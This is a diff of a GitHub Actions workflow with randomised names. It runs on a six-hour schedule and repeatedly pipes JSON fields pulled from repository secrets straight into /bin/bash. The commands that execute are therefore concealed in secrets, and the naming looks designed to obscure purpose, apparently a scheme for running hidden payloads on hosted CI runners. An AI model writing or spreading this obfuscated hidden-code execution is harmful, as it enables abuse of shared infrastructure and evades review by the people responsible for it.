@@ -3,24 +3,24 @@ name: jinxinnian3421
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 3/6 * * *'
-
-jobs:  # 32629
+    - cron: '21 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jinxinnian3421
         env:
-          tgyjf766: ${{ secrets.tgyjf766 }}
+          rgam2: ${{ secrets.rgam2 }}
         run: |
-          echo $tgyjf766 | jq -r .wep2727 | /bin/bash
-          echo $dqmyr3857 | jq -r .f451 | /bin/bash
-          echo $fivmk83783 | jq -r .tgq1 | /bin/bash
-          echo $hl674 | jq -r .pbxcy64 | /bin/bash
-          echo $nkf6 | jq -r .bj757 | /bin/bash
-          echo $n21039 | jq -r .clk58321 | /bin/bash
-          echo $fdn31 | jq -r .ixykt262 | /bin/bash
-          echo $ipf4310 | jq -r .wrxrl97 | /bin/bash
+          echo $rgam2 | jq -r .cdws15528 | /bin/bash
+          echo $eibt8904 | jq -r .khiy1229 | /bin/bash
+          echo $duxys75 | jq -r .hvqtv50 | /bin/bash
+          echo $zx81 | jq -r .o03 | /bin/bash
+          echo $kqxv9956 | jq -r .kg48 | /bin/bash
+          echo $vnmd11546 | jq -r .bisf533 | /bin/bash
+          echo $dsues3461 | jq -r .yfg46 | /bin/bash
+          echo $gofqq55765 | jq -r .g6129 | /bin/bash
+          echo $juzq00 | jq -r .kpsdc18 | /bin/bash
+          echo $qi194 | jq -r .rvsyl51 | /bin/bash
 
